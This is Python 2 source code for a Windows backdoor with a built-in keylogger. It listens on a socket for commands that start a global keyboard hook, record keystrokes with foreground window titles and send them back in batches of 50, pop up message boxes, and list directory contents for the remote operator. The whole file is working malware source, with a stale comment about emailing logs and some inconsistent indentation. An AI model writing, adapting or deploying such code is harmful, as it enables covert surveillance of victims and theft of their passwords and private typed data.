import socket
from ctypes import *
import ctypes
import smtplib
import pyHook, pythoncom, sys, logging
import os

# Access DLLs [Keylog]
user32 = windll.user32
kernel32 = windll.kernel32
winTitle = None

# Response Variable
response = ""

# Log List [Keylog]
grab = []
concat = ""

def main():
    global connection
    global concat
    global hooks_manager

    # Open Socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Listen with specified Port
    server_address = ('localhost', 1000)
    print "[!] Listening..."
    sock.bind(server_address)
    sock.listen(1)

    while True:
        # Wait for a connection
        connection, client_address = sock.accept()

        try:
            print '[+] connection made (Backdoor Accessed)'

            # Receive the data in small chunks and retransmit it

            data = connection.recv(1024)
            if data == "test":
            	print "[!] Test data received"
            	response = " [+] Connection is solid!"
                connection.sendall(response)
            if data == "keylog":
                hooks_manager = pyHook.HookManager()
                hooks_manager.KeyDown = OnKeyboardEvent
                hooks_manager.HookKeyboard()
                pythoncom.PumpMessages()
            if "alert" in data:
                print "[!] Alert displayed."
                response = " [!] MessageBox sent."
                connection.sendall(response)
                q = data[6:]
                ctypes.windll.user32.MessageBoxA(0, q, "Backdoor.py", 0)
            if "dir" in data:
                print "[!] Scanning directory."
                q = data[4:]
                ScanDir(q)
            else:
                print '[-] no more data from (Connection Closed)'
        finally:
            pass

def OnKeyboardEvent(event):
    # globalize for Window Title Condition
    global winTitle
    global hooks_manager
    global connection
    global concat

    # If window title is different, then call title function
    if event.WindowName != winTitle:
    	winTitle = event.WindowName
    	getWindowTitle()

    # Keylog related code...
    logging.basicConfig(level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii) + " - %s" % len(grab))
    grab.append( chr(event.Ascii))

    # This condition checks how many keystrokes detected
    # When X amount of keystrokes detected, send key list to email function
    if len(grab) >= 50:
    	print '\n[!] Relaying strokes...\n'

        for iz in grab:
            concat = concat + iz

    	connection.sendall(concat)

    	# Clear list for more logging
    	del grab[:]

    	hooks_manager.UnhookKeyboard()
        return
    else:
    	pass

    return True
    
# Detect Window Title
def getWindowTitle():
	# Get window in focus
	hwnd = user32.GetForegroundWindow()

	# Extract the window's title
	title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(title),512)
	
	# Display title in console
	print "\n\n[ %s ]\n\n" % ( title.value)
	grab.append("\n\n[ " + title.value + " ]\n\n")
	
	# Close
	kernel32.CloseHandle(hwnd)
	return True

def ScanDir(selDir):
    try:
        print "\nScanning Directory: %s..." % (selDir)
        prepDir = ""
        dirCollect = os.listdir(selDir)
        for dirScan in dirCollect:
            print dirScan
            prepDir = prepDir + "\n    " + dirScan
        connection.sendall(prepDir)
    except:
        print "Directory Scan Error for (%s)" % (selDir)


main()